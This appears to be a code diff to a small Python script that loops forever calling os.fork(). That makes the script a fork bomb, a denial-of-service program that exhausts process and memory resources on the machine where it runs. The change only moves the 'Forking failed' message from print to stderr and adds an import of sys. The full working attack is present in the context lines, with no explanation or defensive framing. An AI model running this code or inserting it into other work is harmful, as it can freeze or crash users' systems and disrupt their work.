@@ -2,10 +2,11 @@
 
 import os
 import time
+import sys
 
 while True:
     try:
         os.fork()
     except:
-        print("Forking failed...")
+        sys.stderr.write("Forking failed\n")
         time.sleep(1)
